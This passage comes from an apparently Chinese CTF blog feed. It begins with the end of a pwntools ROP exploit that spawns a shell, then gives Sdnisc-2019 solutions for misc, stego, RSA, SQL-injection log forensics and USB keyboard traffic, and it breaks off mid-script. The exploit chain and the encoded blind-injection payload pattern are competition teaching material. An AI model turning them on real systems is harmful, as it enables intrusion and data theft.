class="number">0x48</span> + p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(binsh_addr) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(gadget2)</span><br><span class="line">payload += <span class="string">"\x00"</span> * <span class="number">56</span></span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload  = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><ul><li>感谢各位师傅。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/22171.jpg" alt></p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=42933&highlight=pwn" target="_blank" rel="noopener">i春秋</a></p><p><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">安全客</a></p><p><a href="https://www.jianshu.com/p/463d2fafb538" target="_blank" rel="noopener">简书</a></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>Sdnisc-2019</title>
    <url>/2019/11/04/Sdnisc-2019/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/30.png" alt></p><a id="more"></a><hr><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=4978809&auto=1&height=66"></iframe><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul><li>菜是原罪。</li><li>目前还未更完,持续更新中…</li></ul><h1 id="0x01-MISC"><a href="#0x01-MISC" class="headerlink" title="0x01 MISC"></a>0x01 MISC</h1><h2 id="0x001-签到题"><a href="#0x001-签到题" class="headerlink" title="0x001 签到题"></a>0x001 签到题</h2><ul><li>拖入IDA查看字符串即可得到flag,或者不拖入IDA,直接记事本打开搜索flag也能找到。</li></ul><h2 id="0x002-上下左右"><a href="#0x002-上下左右" class="headerlink" title="0x002 上下左右"></a>0x002 上下左右</h2><ul><li><p>脑洞大开的题目,考察PIL库或者turtal库等的使用。</p></li><li><p>D代表Down(下),R代表Right(右),L代表Left(左),U代表UP(上)。</p></li><li><p>脚本如下。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment">#xyij这几个可以根据情况自行在合适的范围内调整。</span></span><br><span class="line">x = <span class="number">200</span></span><br><span class="line">y = <span class="number">200</span></span><br><span class="line">i = <span class="number">5</span></span><br><span class="line">j = <span class="number">5</span></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>, (x, y))</span><br><span class="line">im.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\flag.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    str = file.read()</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">if</span> s == <span class="string">'D'</span>:</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">'R'</span>:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">'U'</span>:</span><br><span class="line">            j-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">'L'</span>:</span><br><span class="line">            i-=<span class="number">1</span></span><br><span class="line">        im.putpixel((i, j), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><ul><li>运行脚本就能画出来flag了。</li></ul><h2 id="0x003-压缩包的秘密"><a href="#0x003-压缩包的秘密" class="headerlink" title="0x003 压缩包的秘密"></a>0x003 压缩包的秘密</h2><ul><li>用16进制查看器查看文件发现压缩包flag.zip的每相邻两个字节互换了位置,写个脚本还原回去。脚本如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">f = open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\misc3\\flag.zip'</span>,<span class="string">'rb'</span>)</span><br><span class="line">ff = open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\misc3\\newflag.zip'</span>,<span class="string">'wb'</span>)</span><br><span class="line">str = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(str),<span class="number">2</span>):</span><br><span class="line">    ff.write(str[i+<span class="number">1</span>])</span><br><span class="line">    ff.write(str[i])</span><br><span class="line">f.close()</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure><ul><li>还原以后发现压缩包有密码,用16进制查看器查看发现尾部有一段字符串<code>dGhlcmUtaXMtaGFsZi1wd2Qtc2hlbnNp</code>,是一段base64,解码以后是<code>there-is-half-pwd-shensi</code>,也就是说<code>shensi</code>是压缩包密码的一半。</li><li>那么掩码爆破另外6个字符即可,不到半分钟就能爆破出来,爆破得到最终密码为<code>sdniscshensi</code>,解压压缩包即可得到flag。</li></ul><h1 id="0x02-Stego"><a href="#0x02-Stego" class="headerlink" title="0x02 Stego"></a>0x02 Stego</h1><h2 id="0x001-啾咪"><a href="#0x001-啾咪" class="headerlink" title="0x001 啾咪~"></a>0x001 啾咪~</h2><ul><li><p>又一道想暴打出题人的题目,这道题竟然有一半左右的人做出来???</p></li><li><p>用Stegosolve打开,Analyse-Data Extract。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105204115.png" alt></p><ul><li>这么勾选(这道题是BGR)然后点Preview,能找到一串base64(出题人还不忘提醒这就是flag.txt),解码得到flag。</li></ul><h2 id="0x002-我和我的祖国"><a href="#0x002-我和我的祖国" class="headerlink" title="0x002 我和我的祖国"></a>0x002 我和我的祖国</h2><ul><li>考察音频隐写。</li><li>将附件拖入Audacity,在末尾,有猫腻。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105093625.png" alt></p><ul><li>向上表示1,向下表示0得到<code>0110011001101100011000010110011101111011011001100110010100111000011001100110010000110100001101100011100000110010001100000011010100110001001100110110001000110101001101000110001101100100011001000011010100111001011000100011000000110100001110000011010100110111001100010011100101100110001110010011010001111101</code></li><li>bin转ascii得到flag。</li></ul><h2 id="0x003-你真的很不错"><a href="#0x003-你真的很不错" class="headerlink" title="0x003 你真的很不错"></a>0x003 你真的很不错</h2><ul><li><p>根据题目提示要求用winrar,考虑到这道题目是NTFS流隐写。</p></li><li><p>打开工具NtfsStreamsEditor,用winrar将附件flag.rar里面的内容解压出来,然后在NtfsStreamsEditor搜索,找到flag.png。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105204658.png" alt></p><ul><li>导出flag.png,查看该图片即可得到flag。</li></ul><h1 id="0x03-Crypto"><a href="#0x03-Crypto" class="headerlink" title="0x03 Crypto"></a>0x03 Crypto</h1><h2 id="0x001-简单的密码学"><a href="#0x001-简单的密码学" class="headerlink" title="0x001 简单的密码学"></a>0x001 简单的密码学</h2><ul><li>考察培根密码,解密得到<code>BACONEASY</code>。</li></ul><h2 id="0x003-被加密的消息"><a href="#0x003-被加密的消息" class="headerlink" title="0x003 被加密的消息"></a>0x003 被加密的消息</h2><ul><li><p>考察RSA相关知识。</p></li><li><p>后续会写一篇关于RSA的博客, 解密脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">132874559018378928431039440207926203692459793792348908672840445003264268709142821089064063059664054997624354040367339834740402484489217092916932927523665031792688652405172441259540233143526085691290500429921362666149858204259223146323188880312113596285869242888916181594189809400830983088384594648368192585387</span></span><br><span class="line">dp = <span class="number">591317922916712527852981087692920294081526731184970969084059479425641071480269272618065340614260809042370271672930352969371906804874484366604552515101473</span></span><br><span class="line">c = <span class="number">105561263344197224500437985369890277605607419491189003046055021715638244356677672489534224683808733691744645034854814587326664189059178955870261337977176277155277781998771630340367082086864012637516012166291357901866101513273848851471805311144501065601880125348980410104702516232148506526616670074084982119236</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65538</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">            p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">            q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br><span class="line">            phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">            d = gmpy2.invert(e,phi)%phi</span><br><span class="line">            <span class="keyword">print</span> libnum.n2s(pow(c,d,n))</span><br></pre></td></tr></table></figure><h1 id="0x04-Forensic"><a href="#0x04-Forensic" class="headerlink" title="0x04 Forensic"></a>0x04 Forensic</h1><h2 id="0x001-日志分析"><a href="#0x001-日志分析" class="headerlink" title="0x001 日志分析"></a>0x001 日志分析</h2><ul><li><p>考察盲注日志分析以及写脚本(正则)的能力。</p></li><li><p>比赛的时候脚本写不出来,手撕的,费眼而且费了不少时间…</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191106090031.png" alt></p><ul><li>找规律可以得到如上图所示: 在每个<code>C1、C2、C3、C4...</code>区间中,从下往上找第一个状态码200右边的那个值为215的日志对应的%3E后面的那个数。。。那个数就是flag中某一位的ascii码, 而且从C1一直到C38~ 依次找到的是flag的第一位、第二位….第三十八位。</li></ul><ul><li>至于怎么找到的这个规律…WEB选手可能有别的办法,但卑微菜鸡是把<code>flag{</code>正向输出得到ascii码为<code>102 108 97 103 123</code>,然后通过ascii码去找对应的<code>215(Response包的长度)</code>,然后基本找到规律以后又去验证了一下第38位<code>}</code>,根据规律果然能得到应有的结果<code>125</code>。</li></ul><ul><li><p>这种找规律的方法带有猜的因素, 但是前面几道题目的flag大都是38位:<code>flag{</code> + 32位的16进制(大概是md5), + <code>}</code>, 能做出来这个也算是我走运吧~</p></li><li><p>赛后写了个匹配脚本(re大法好):</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\access.log'</span>,<span class="string">'r'</span>)</span><br><span class="line">buf = f.read()</span><br><span class="line"><span class="comment">#匹配所有结果为215的字符串, 匹配两个部位,第一个部位匹配的是C1、C2....Cn,第二个部位匹配flag的Ascii码值。</span></span><br><span class="line">pattern = <span class="string">r'LIMIT%200%2C1%29%2C(\w+)%2C1%29%29%3E(\w+)%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1" 200 215'</span></span><br><span class="line">pattern = re.compile(pattern)</span><br><span class="line"><span class="comment">#利用findall方法大概可以方便一些吧。</span></span><br><span class="line">L = re.findall(pattern,buf)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">Cn = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(L)):</span><br><span class="line">    CurCn = int(L[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> CurCn &gt; Cn:</span><br><span class="line">        flag += chr(int(L[i<span class="number">-1</span>][<span class="number">1</span>]))</span><br><span class="line">        Cn = CurCn</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h2 id="0x004-流量分析"><a href="#0x004-流量分析" class="headerlink" title="0x004 流量分析"></a>0x004 流量分析</h2><ul><li><p>考察USB流量分析。</p></li><li><p>用wireshark从附件hack.pcapng中可以提取出来一个zip文件,名字为flag.zip。</p></li><li><p>zip的密码可以通过分析USB流量获得。</p></li></ul><blockquote><p>USB协议的数据部分在Leftover Capture Data域之中，在Mac和Linux下可以用tshark命令可以将 leftover capture data单独提取出来。</p></blockquote><ul><li><p>Mac或者Linux下的命令为<code>tshark -r hack.pcapng -T fields -e usb.capdata</code>,如果想导入usbdata.txt文件中，后面加上参数：<code>&gt;usbdata.txt</code>。</p></li><li><p>Windows下如果安装了wireshark,可以在wireshark的安装目录下找到tshark.exe,调用cmd定位到wireshark的安装目录下,并将hack.pcapng也放到安装目录下,用命令<code>tshark.exe -r hack.pcapng -T fields -e usb.capdata</code>,同样如果要导入到txt文件中,后面也要加上参数。</p></li></ul><blockquote><p>键盘数据包的数据长度为8个字节，击键信息集中在第3个字节，每次key stroke都会产生一个keyboard event usb packet。</p></blockquote><blockquote><p>鼠标数据包的数据长度为4个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。</p></blockquote><ul><li>下方通过python字典的形式列出了usb keyboard的映射关系。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br></pre></td></tr></table></figure><ul><li>所以完整解密脚本如下(已经将Leftover Capture Data提取到usbdata.txt中):</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">f = open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\usbdata.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">Lines = f.readlines()</span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span 